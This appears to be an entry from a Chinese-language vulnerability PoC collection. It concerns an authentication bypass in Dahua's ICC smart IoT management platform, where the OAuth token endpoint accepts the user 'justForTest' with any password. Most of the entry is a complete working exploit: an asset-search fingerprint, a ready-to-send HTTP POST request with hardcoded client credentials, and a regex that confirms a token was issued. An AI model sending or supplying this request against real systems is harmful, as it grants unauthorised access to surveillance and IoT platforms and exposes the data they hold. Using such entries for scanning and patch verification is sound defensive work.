﻿# 大华智能物联综合管理平台ICC justForTest用户登录漏洞

> 更新时间：2023-12-13

> 漏洞编号：

> 漏洞说明：浙江大华技术股份有限公司智能物联综合管理平台 用户登录接口/evo-apigw/evo-oauth/oauth/token存在漏洞，使用用户justForTest/任意密码即可成功登录平台，造成信息泄露。

> 漏洞特征：body="*客户端会小于800*"

> 验证脚本：HTTP

```
POST /evo-apigw/evo-oauth/oauth/token HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close

username=justForTest&password=1&grant_type=password&client_id=web_client&client_secret=web_client&public_key=
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?success)(?=.*?access_token).*?$

> 上传文件定位：


> 验证文件来源：大华智能物联综合管理平台ICC justForTest用户登录漏洞.poc
